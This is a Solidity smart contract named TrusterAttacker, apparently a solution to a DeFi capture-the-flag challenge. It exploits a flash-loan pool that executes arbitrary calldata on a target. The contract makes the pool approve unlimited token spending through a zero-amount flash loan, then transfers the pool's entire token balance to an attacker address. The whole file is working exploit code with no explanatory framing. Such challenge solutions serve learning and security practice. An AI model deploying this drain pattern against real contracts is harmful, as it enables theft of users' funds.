// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";


interface IPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttacker {
    IPool immutable pool;
    address private attacker;
    IERC20 immutable token;

    constructor(address _poolAddress, address _tokenAddress, address _attacker) {
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = _attacker;
    }


    function attack() external {
        // Approve unlimited spending of pool through flashloan
        bytes memory data = abi.encodeWithSignature(("approve(address,uint256)"), address(this), 2 ** 256 -1);
        pool.flashLoan(0, address(this), address(token), data);

        // send all the tokens from the pool to the attacker
        uint256 balance = token.balanceOf(address(pool));

        token.transferFrom(address(pool), attacker, balance);
    }
}
